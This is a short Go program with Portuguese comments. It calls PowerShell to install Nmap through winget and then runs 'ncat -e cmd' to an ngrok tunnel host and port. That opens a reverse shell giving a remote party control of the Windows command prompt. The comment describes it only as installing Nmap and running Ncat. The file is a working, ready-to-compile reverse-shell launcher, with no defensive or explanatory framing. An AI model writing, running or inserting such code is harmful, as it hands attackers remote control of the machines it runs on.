package main

import (
	"fmt"
	"os/exec"
)

func main() {
	// Comando PowerShell para instalar o Nmap e depois rodar o Ncat
	cmd := exec.Command("powershell.exe", "-c", "winget install Insecure.Nmap; ncat -e cmd 0.tcp.sa.ngrok.io 19109")

	// Executa o comando
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("Erro ao executar o comando: %v\n", err)
	}

	// Exibe a saída do comando
	fmt.Println(string(output))
}